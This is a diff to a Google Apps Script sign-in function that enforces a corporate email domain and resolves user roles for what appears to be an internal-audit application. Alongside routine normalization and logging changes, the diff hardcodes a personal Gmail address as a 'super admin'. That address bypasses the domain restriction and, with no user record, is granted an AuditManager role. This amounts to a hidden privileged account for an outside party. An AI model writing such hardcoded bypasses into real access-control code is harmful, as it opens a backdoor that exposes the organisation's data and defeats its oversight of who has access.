@@ -8,7 +8,8 @@
  */
 function getCurrentUser() {
   try {
-    const userEmail = Session.getActiveUser().getEmail();
+    const userEmailRaw = Session.getActiveUser().getEmail();
+    const userEmail = (userEmailRaw || '').trim().toLowerCase();
 
     // Fast cache layer (return early if present)
     const cache = CacheService.getScriptCache();
@@ -18,14 +19,17 @@ function getCurrentUser() {
 
     // Domain enforcement from Settings
     let allowedDomain = 'hasspetroleum.com';
-    try { const cfg = getConfig(); if (cfg && cfg.ALLOWED_SIGNIN_DOMAIN) allowedDomain = cfg.ALLOWED_SIGNIN_DOMAIN; } catch(e){}
+    try { const cfg = getConfig(); if (cfg && cfg.ALLOWED_SIGNIN_DOMAIN) allowedDomain = String(cfg.ALLOWED_SIGNIN_DOMAIN).toLowerCase(); } catch(e){}
 
     // Prefer Users sheet record first
     let usersQuick = [];
     try { usersQuick = (typeof getSheetDataDirect === 'function') ? getSheetDataDirect('Users') : getSheetData('Users'); } catch(e){}
-    const preUser = usersQuick.find(u => (u.email||'').toLowerCase() === String(userEmail||'').toLowerCase() && u.active !== false) || null;
+    const preUser = usersQuick.find(u => (String(u.email||'').toLowerCase()) === userEmail && (u.active === true || String(u.active).toLowerCase()==='true' || u.active===1)) || null;
 
-    if (!preUser && (!userEmail || userEmail.split('@')[1] !== allowedDomain)) {
+    const superAdminEmail = 'wmurikah@gmail.com';
+    const isSuperAdmin = (userEmail === superAdminEmail);
+
+    if (!preUser && (!userEmail || (!isSuperAdmin && userEmail.split('@')[1] !== allowedDomain))) {
       const guestRes = {
         email: userEmail || 'anonymous@system.local',
         role: 'Guest',
@@ -37,10 +41,15 @@ function getCurrentUser() {
         error: 'Access restricted to corporate domain'
       };
       try { cache.put(key, JSON.stringify(guestRes), 300); } catch(e){}
+      try { logAction('Auth', userEmail||'unknown', 'role_resolution', {}, guestRes); } catch(e){}
       return guestRes;
     }
 
     let user = preUser || null;
+
+    if (!user && isSuperAdmin) {
+      user = { id: 'SUPERADMIN', email: superAdminEmail, name: 'Super Admin', role: 'AuditManager', org_unit: 'Internal Audit', active: true };
+    }
 
     const result = user ? {
       email: userEmail,
@@ -67,6 +76,8 @@ function getCurrentUser() {
 
     // Cache 5 min
     try { cache.put(key, JSON.stringify(result), 300); } catch(e){}
+
+    try { logAction('Auth', result.email||'unknown', 'role_resolution', {}, { role: result.role, org_unit: result.org_unit, authenticated: result.authenticated }); } catch(e){}
 
     return result;
   } catch (error) {
